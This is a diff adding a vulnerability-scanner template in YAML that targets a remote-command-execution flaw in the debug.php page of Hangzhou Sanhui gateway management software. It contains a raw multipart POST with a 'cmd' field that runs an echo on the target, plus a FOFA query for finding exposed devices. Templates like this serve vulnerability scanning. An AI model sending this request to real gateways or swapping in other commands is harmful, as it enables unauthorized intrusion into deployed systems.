@@ -1,0 +1,47 @@
+id: poc-er9yy5dbd2fg5bvi
+info:
+  name: 杭州三汇网关 debug rce漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/er9yy5dbd2fg5bvi'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: er9yy5dbd2fg5bvi
+    fofa: body="text ml10 mr20" && title="网关管理软件"
+http:
+- raw:
+  - 'POST /debug.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+
+    ------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
+
+    Content-Disposition: form-data; name="comdtype"
+
+
+    1
+
+    ------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
+
+    Content-Disposition: form-data; name="cmd"
+
+
+    echo djwaodjoajdwadj23
+
+    ------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
+
+    Content-Disposition: form-data; name="run"
+
+
+    ------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
